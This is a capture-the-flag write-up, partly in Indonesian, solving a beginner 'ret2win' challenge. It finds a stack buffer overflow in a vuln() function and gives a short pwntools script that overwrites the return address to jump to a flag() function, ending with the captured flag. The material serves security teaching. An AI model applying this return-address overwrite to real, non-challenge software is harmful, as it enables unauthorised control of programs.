# baby-pwn-0.5
> Write-up author: vreshco
## DESCRIPTION:
Tahukah kamu kalau kita bisa mengendalikan return address menggunakan vulnerability buffer overflow dan mengakibatkan kita bisa mengendalikan alur program.

koneksikan menggunakan:
## HINT:
- NONE
## STEPS:
1. First, download the file given, then check the file type.

> RESULT - 64 bit binary file, not stripped.

![image](https://user-images.githubusercontent.com/70703371/213631824-6b14f82e-4b9b-4153-b117-657a175ad4b7.png)


2. Now check the binary's protection.

> RESULT - Partial RELRO, No canary found, No PIE

![image](https://user-images.githubusercontent.com/70703371/213631927-66d3eb00-f8c0-48c9-a590-d4bfc1c6bb99.png)


3. Now let's straight to decompile the binary.
4. Open the `vuln()` function.

![image](https://user-images.githubusercontent.com/70703371/213632167-c4519e0e-b4e8-40b5-822a-7d745eb6013c.png)


5. Based from it we can see there's a bufferoverlow, the `local_28` accetps 32 bytes but the fgets accept 100. We can utilize that.
6. I see there's a `flag()` function, but the it's not called at the vuln, hence we can use the `ret2win` concept. Atfer overwrite the RBP value we need to add the flag offset at the end of our payload.
7. To solve this challenge i used pwntools.

> THE SCRIPT

```py
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:  
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  
        return process([exe] + argv, *a, **kw)


exe = './chall'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

sh = start()
sh.recvuntil(b'\n')
offset = b'A' * 40
p = flat([
    offset,
    0x4012f2
])
#ffset += p64(1)
sh.sendline(p)
sh.interactive()
```

> OUTPUT - run it remotely

![image](https://user-images.githubusercontent.com/70703371/213632788-309d502c-dda8-4e58-a679-b8693f5c76d3.png)


8. Got the flag!

## FLAG

```
TCP1P{changing_the_return_address_0_5_461821934561283}
```


